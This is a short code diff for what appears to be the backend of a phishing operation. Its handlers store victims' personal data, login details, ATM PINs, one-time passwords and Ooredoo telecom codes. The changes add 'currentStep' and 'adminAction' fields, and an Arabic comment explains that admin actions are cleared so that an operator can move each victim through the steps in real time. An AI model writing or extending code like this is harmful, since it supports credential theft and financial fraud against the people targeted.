@@ -19,7 +19,7 @@ export async function submitPersonalData(data: any) {
     submittedAt: new Date(),
   });
   await db.update(sessions)
-    .set({ updatedAt: new Date() })
+    .set({ updatedAt: new Date(), currentStep: "login" })
     .where(eq(sessions.id, data.sessionId));
 }
 
@@ -29,7 +29,7 @@ export async function submitLoginMethod(data: any) {
     submittedAt: new Date(),
   });
   await db.update(sessions)
-    .set({ updatedAt: new Date() })
+    .set({ updatedAt: new Date(), adminAction: null, currentStep: "login" })
     .where(eq(sessions.id, data.sessionId));
 }
 
@@ -39,7 +39,7 @@ export async function submitAtmPin(data: any) {
     submittedAt: new Date(),
   });
   await db.update(sessions)
-    .set({ updatedAt: new Date() })
+    .set({ updatedAt: new Date(), adminAction: null, currentStep: "atm" })
     .where(eq(sessions.id, data.sessionId));
 }
 
@@ -48,8 +48,13 @@ export async function submitOtp(data: any) {
     ...data,
     submittedAt: new Date(),
   });
+  // نقوم بمسح أي إجراء آدمن سابق عند إرسال OTP جديد للسماح بالمتابعة
   await db.update(sessions)
-    .set({ updatedAt: new Date() })
+    .set({ 
+      updatedAt: new Date(), 
+      adminAction: null,
+      currentStep: data.otpType === "ooredoo" ? "otp_ooredoo" : "otp" 
+    })
     .where(eq(sessions.id, data.sessionId));
 }
 
@@ -59,7 +64,7 @@ export async function submitOoredoo(data: any) {
     submittedAt: new Date(),
   });
   await db.update(sessions)
-    .set({ updatedAt: new Date() })
+    .set({ updatedAt: new Date(), adminAction: null, currentStep: "ooredoo" })
     .where(eq(sessions.id, data.sessionId));
 }
 
